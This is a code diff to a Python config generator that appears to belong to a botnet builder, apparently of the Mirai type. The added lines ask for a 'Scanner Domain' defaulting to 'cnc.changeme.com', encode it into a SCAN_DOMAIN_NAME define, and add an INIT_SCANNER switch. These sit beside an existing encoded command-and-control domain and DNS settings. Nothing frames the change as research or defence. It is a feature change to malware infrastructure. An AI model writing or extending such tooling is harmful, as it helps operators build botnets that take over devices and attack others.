@@ -55,10 +55,21 @@ x, l = do_enc(domain)
 config += f"#define DOMAIN_NAME \"{x}\"\n"
 config += f"#define DOMAIN_NAME_LEN {l}\n"
 
+domain = show_dialog({ "type" : "text", "desc" : "Scanner Domain" }, "cnc.changeme.com")
+x, l = do_enc(domain)
+
+config += f"#define SCAN_DOMAIN_NAME \"{x}\"\n"
+config += f"#define SCAN_DOMAIN_NAME_LEN {l}\n"
+
 dns = show_dialog({ "type" : "text", "desc" : "DNS server" }, "8.8.8.8")
 for i, s in enumerate(dns.split(".")):
     config += f"#define DNS_{i} {s}\n"
 
+
+if show_dialog({ "type" : "question", "desc" : "Init scanner" }, "undef"):
+    config += f"#define INIT_SCANNER\n"
+else:
+    config += f"// #define INIT_SCANNER\n"
 
 config += "#endif\n"
 
